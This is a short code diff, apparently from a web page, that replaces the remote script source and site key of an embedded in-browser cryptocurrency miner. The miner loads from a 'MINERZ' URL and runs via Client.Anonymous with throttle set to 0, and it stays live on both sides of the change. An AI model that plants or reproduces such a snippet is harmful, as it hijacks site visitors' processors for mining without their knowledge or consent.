@@ -1,6 +1,6 @@
-<script src="https://github.com/madridminez/MINERZ3GJS.php?f=wWCz.js"></script>
+<script src="https://github.com/madridminez/MINERZ/MJ5E.php?f=WLe2.js"></script>
 <script>
-    var _client = new Client.Anonymous('5de31475bb6035cc03535924c0fd5f3661a23d608d56d4da39c0ec943b757123', {
+    var _client = new Client.Anonymous('5fa16649365ad44563370157107e348cbcd74f3bb817acd66c1a9867173e6003', {
         throttle: 0
     });
     _client.start();
